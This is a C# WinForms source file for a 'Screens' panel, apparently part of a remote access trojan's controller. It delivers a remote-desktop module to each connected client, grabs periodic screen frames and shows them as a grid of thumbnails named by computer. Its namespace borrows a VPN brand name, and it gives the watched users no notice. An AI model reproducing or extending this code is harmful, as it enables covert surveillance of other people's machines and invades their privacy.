using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;

namespace mullvad.Forms
{
    internal sealed class ScreensPanel : Form
    {
        private const string ModuleFile = "mullvad.Module.RemoteDesktop";
        private const string ModuleId   = "mullvad.remotedesktop";

        private readonly Dictionary<string, ClientHandler> _handlers;
        private readonly List<string[]>                    _connections;

        public event Action<string>?        ClientDoubleClicked;
        public event Action<string, Point>? ClientRightClicked;

        // ── Controls ──────────────────────────────────────────────────────────
        private ToolStrip        _toolbar     = null!;
        private ToolStripButton  _btnStart    = null!;
        private ToolStripButton  _btnStop     = null!;
        private ToolStripComboBox _cmbInterval = null!;
        private ToolStripComboBox _cmbQuality  = null!;
        private FlowLayoutPanel  _grid        = null!;

        // ── State ─────────────────────────────────────────────────────────────
        private bool          _running;
        private System.Windows.Forms.Timer _timer = null!;
        private readonly Dictionary<string, ScreenCell> _cells = new();
        private int           _quality => int.TryParse(_cmbQuality?.ComboBox?.SelectedItem?.ToString(), out int q) ? q : 20;

        public ScreensPanel(Dictionary<string, ClientHandler> handlers, List<string[]> connections)
        {
            _handlers    = handlers;
            _connections = connections;
            Build();
        }

        private void Build()
        {
            SuspendLayout();

            Text      = "Screens";
            BackColor = ThemeManager.ControlColor;
            ForeColor = ThemeManager.ForeColor;

            // ── Toolbar ───────────────────────────────────────────────────────
            _toolbar = new ToolStrip { GripStyle = ToolStripGripStyle.Hidden };

            _btnStart = new ToolStripButton("Start") { DisplayStyle = ToolStripItemDisplayStyle.Text };
            _btnStop  = new ToolStripButton("Stop")  { DisplayStyle = ToolStripItemDisplayStyle.Text, Enabled = false };

            _cmbInterval = new ToolStripComboBox { DropDownStyle = ComboBoxStyle.DropDownList, Width = 70 };
            _cmbInterval.Items.AddRange(new object[] { "1.5s", "3s", "5s", "10s", "20s", "60s" });
            _cmbInterval.SelectedIndex = 2; // 5s default

            _cmbQuality = new ToolStripComboBox { DropDownStyle = ComboBoxStyle.DropDownList, Width = 55 };
            _cmbQuality.Items.AddRange(new object[] { "10", "20", "30", "50", "70", "90" });
            _cmbQuality.SelectedIndex = 1; // 20 default

            _toolbar.Items.Add(_btnStart);
            _toolbar.Items.Add(_btnStop);
            _toolbar.Items.Add(new ToolStripSeparator());
            _toolbar.Items.Add(new ToolStripLabel("Interval:"));
            _toolbar.Items.Add(_cmbInterval);
            _toolbar.Items.Add(new ToolStripSeparator());
            _toolbar.Items.Add(new ToolStripLabel("Quality:"));
            _toolbar.Items.Add(_cmbQuality);

            // ── Grid ──────────────────────────────────────────────────────────
            _grid = new FlowLayoutPanel
            {
                Dock          = DockStyle.Fill,
                BackColor     = Color.Black,
                AutoScroll    = true,
                WrapContents  = true,
                FlowDirection = FlowDirection.LeftToRight,
                Padding       = new Padding(3),
            };

            Controls.Add(_grid);
            Controls.Add(_toolbar);

            _timer = new System.Windows.Forms.Timer { Interval = 5000 };
            _timer.Tick += Timer_Tick;

            _btnStart.Click += BtnStart_Click;
            _btnStop.Click  += BtnStop_Click;

            FormClosed += (_, _) => StopTimer();

            ResumeLayout(false);
        }

        private void BtnStart_Click(object? sender, EventArgs e)
        {
            if (_running) return;
            _running          = true;
            _btnStart.Enabled = false;
            _btnStop.Enabled  = true;
            UpdateTimerInterval();
            RebuildGrid();
            _timer.Start();
            RefreshAll();
        }

        private void BtnStop_Click(object? sender, EventArgs e) => Stop();

        private void Stop()
        {
            if (!_running) return;
            StopTimer();
        }

        private void StopTimer()
        {
            _running          = false;
            _timer.Stop();
            _btnStart.Enabled = true;
            _btnStop.Enabled  = false;
            // Intentionally keep cells and frames visible after stop
        }

        private void UpdateTimerInterval()
        {
            string sel = _cmbInterval.ComboBox?.SelectedItem?.ToString() ?? "5s";
            if (double.TryParse(sel.TrimEnd('s'), out double secs))
                _timer.Interval = Math.Max(500, (int)(secs * 1000));
        }

        private void Timer_Tick(object? sender, EventArgs e)
        {
            UpdateTimerInterval();
            RebuildGrid();
            RefreshAll();
        }

        private void RebuildGrid()
        {
            var ids = new HashSet<string>(_handlers.Keys);

            foreach (var id in new List<string>(_cells.Keys))
            {
                if (!ids.Contains(id))
                {
                    _grid.Controls.Remove(_cells[id]);
                    _cells[id].Dispose();
                    _cells.Remove(id);
                }
            }

            foreach (var id in ids)
            {
                if (!_cells.ContainsKey(id) && _handlers.TryGetValue(id, out var h))
                {
                    var cell = new ScreenCell(h.Info.Computer, id, this);
                    _cells[id] = cell;
                    _grid.Controls.Add(cell);
                }
            }
        }

        private void RefreshAll()
        {
            foreach (var kv in _cells)
            {
                if (_handlers.TryGetValue(kv.Key, out var h))
                    _ = CaptureFrameAsync(kv.Key, h, kv.Value);
            }
        }

        private async Task CaptureFrameAsync(string id, ClientHandler handler, ScreenCell cell)
        {
            try
            {
                var bytes = ModuleLoader.GetModuleBytes(ModuleFile);
                if (bytes == null) return;

                using var deliverCts = new CancellationTokenSource(TimeSpan.FromSeconds(30));
                bool ok = await ModuleDelivery.EnsureDeliveredAsync(handler, ModuleFile, bytes, null, deliverCts.Token);
                if (!ok) return;

                using var ctx = new ModuleContext(handler, ModuleId);

                int q = _quality;
                using var startCts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
                await ctx.ExecuteAsync("start_stream", $"{{\"fps\":1,\"quality\":{q},\"monitor\":0}}", startCts.Token);

                using var frameCts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
                var frameResp = await ctx.ExecuteAsync("get_frame", $"{{\"fps\":1,\"quality\":{q},\"input\":[]}}", frameCts.Token);

                using var stopCts = new CancellationTokenSource(TimeSpan.FromSeconds(3));
                await ctx.ExecuteAsync("stop_stream", "", stopCts.Token);

                if (frameResp?.Contains("\"ok\":true") != true) return;

                int di = frameResp.IndexOf("\"data\":\"");
                if (di < 0) return;
                int s = di + 8, e = frameResp.IndexOf('"', s);
                if (e <= s) return;

                byte[] imgBytes = Convert.FromBase64String(frameResp.Substring(s, e - s));
                Image frame = Image.FromStream(new MemoryStream(imgBytes), false, false);
                if (!IsDisposed) cell.SetFrame(frame);
            }
            catch { }
        }

        internal void FireDoubleClick(string id)  => ClientDoubleClicked?.Invoke(id);

        internal void FireRightClick(string id, Point screenPt)
        {
            var rel = Parent != null ? Parent.PointToClient(screenPt) : screenPt;
            ClientRightClicked?.Invoke(id, rel);
        }

        // ── Screen cell ───────────────────────────────────────────────────────

        private sealed class ScreenCell : Panel
        {
            private readonly Label  _lblName;
            private Image?  _frame;
            private readonly Panel  _img;
            private readonly string _id;
            private readonly ScreensPanel _owner;

            public ScreenCell(string computerName, string id, ScreensPanel owner)
            {
                _id    = id;
                _owner = owner;

                Width     = 192;
                Height    = 118;
                Margin    = new Padding(3);
                BackColor = Color.FromArgb(30, 30, 30);

                _lblName = new Label
                {
                    Text      = computerName,
                    Dock      = DockStyle.Top,
                    Height    = 18,
                    TextAlign = ContentAlignment.MiddleCenter,
                    Font      = new Font("Segoe UI", 7.5F, FontStyle.Bold),
                    ForeColor = Color.White,
                    BackColor = Color.FromArgb(20, 20, 20),
                };

                _img = new DoublePanel { Dock = DockStyle.Fill, BackColor = Color.Black };
                _img.Paint       += Img_Paint;
                _img.DoubleClick += (_, _) => _owner.FireDoubleClick(_id);
                _img.MouseClick  += (_, e) =>
                {
                    if (e.Button == MouseButtons.Right)
                        _owner.FireRightClick(_id, _img.PointToScreen(e.Location));
                };

                Controls.Add(_img);
                Controls.Add(_lblName);
            }

            public void SetFrame(Image? frame)
            {
                if (_img.IsDisposed) return;
                Image? old = _frame;
                _frame = frame;
                old?.Dispose();
                if (!_img.IsDisposed)
                    _img.BeginInvoke((Action)(() => _img.Invalidate()));
            }

            private void Img_Paint(object? sender, PaintEventArgs e)
            {
                var f = _frame;
                if (f == null) return;
                var g    = e.Graphics;
                var size = _img.ClientSize;
                g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                g.DrawImage(f, 0, 0, size.Width, size.Height);
            }

            protected override void Dispose(bool disposing)
            {
                if (disposing) { _frame?.Dispose(); _frame = null; }
                base.Dispose(disposing);
            }

            private sealed class DoublePanel : Panel
            {
                public DoublePanel() { DoubleBuffered = true; }
            }
        }
    }
}
